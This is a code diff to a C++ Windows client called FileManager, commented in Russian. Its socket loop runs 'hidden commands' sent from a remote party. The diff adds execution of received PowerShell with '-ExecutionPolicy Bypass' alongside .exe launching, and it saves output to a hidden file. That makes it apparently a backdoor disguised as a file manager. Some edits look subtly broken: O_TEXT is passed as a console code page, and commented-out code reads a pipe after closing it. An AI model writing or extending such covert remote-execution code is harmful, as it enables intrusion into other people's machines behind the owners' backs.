@@ -225,8 +225,8 @@ void FileManager::RunRequestsCycle()
 int FileManager::run()
 {
     // Устанавливаем кодировку консоли для корректного отображения вывода скрытых команд
-    SetConsoleOutputCP(CP_UTF8);
-    SetConsoleCP(CP_UTF8);
+    SetConsoleOutputCP(O_TEXT);
+    SetConsoleCP(O_TEXT);
 
     // Инициализируем структуры сокета 
     StartClient();
@@ -274,7 +274,6 @@ int FileManager::run()
             // Если в начале запроса есть символ '#' - это запрос на исполнение скрытой команды
             if (request_str[0] == '#')
             {
-                request_str.erase(0, 1);
                 hidden_command_ = request_str;
                 workcallback_ = ExecHiddenCommand;
                 work_ = CreateThreadpoolWork(workcallback_, this, &call_back_environ_);
@@ -297,6 +296,9 @@ int FileManager::run()
     return 0;
 }
 
+
+// TODO 
+// Поправить кодировку вывода powershell
 VOID FileManager::ExecHiddenCommand(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_WORK Work)
 {
     FileManager* ptr = reinterpret_cast<FileManager*>(Parameter);
@@ -311,7 +313,20 @@ VOID FileManager::ExecHiddenCommand(PTP_CALLBACK_INSTANCE Instance, PVOID Parame
 
     int switch_on;
     if (cmd.find(".exe") != string::npos)
+    {
+        cmd.erase(0, 1);
         switch_on = 1;
+    }
+    else if (cmd.find("#ps1") != string::npos)
+    {
+        cmd.erase(0, 4);
+        // Формируем команду для запуска PowerShell скрипта
+        std::string command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"";
+        command += cmd;
+        command += "\"";
+        cmd = command;
+        switch_on = 0;
+    }
     else
         switch_on = 0;
 
@@ -334,6 +349,30 @@ VOID FileManager::ExecHiddenCommand(PTP_CALLBACK_INSTANCE Instance, PVOID Parame
             result = "Error start .exe file.";
         break;
 
+    /*case 2:
+        // Открываем процесс PowerShell в режиме чтения и записи
+        pipe = _popen("powershell.exe", "r+");
+        if (pipe == nullptr)
+            result = "Ошибка при запуске PowerShell.";
+
+        // Записываем скрипт в процесс PowerShell
+        fputs(cmd.c_str(), pipe);
+        fflush(pipe);
+
+        // Закрываем входной поток процесса PowerShell
+        fclose(pipe);
+
+        // Читаем вывод из процесса PowerShell
+        char buffer[128];
+        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+            result += buffer;
+        }
+
+        // Закрываем процесс PowerShell
+        _pclose(pipe);
+
+        break;*/
+
     case 0:
         h_file = CreateFileA("_popen.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
         SetHandleInformation(h_file, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
@@ -352,7 +391,7 @@ VOID FileManager::ExecHiddenCommand(PTP_CALLBACK_INSTANCE Instance, PVOID Parame
 
         CloseHandle(h_file);
 
-        pipe = fopen("_popen.txt", "r");
+        pipe = fopen("_popen.txt", "rb");
         // Читаем вывод команды и сохраняем его в строку
         while (!feof(pipe))
         {
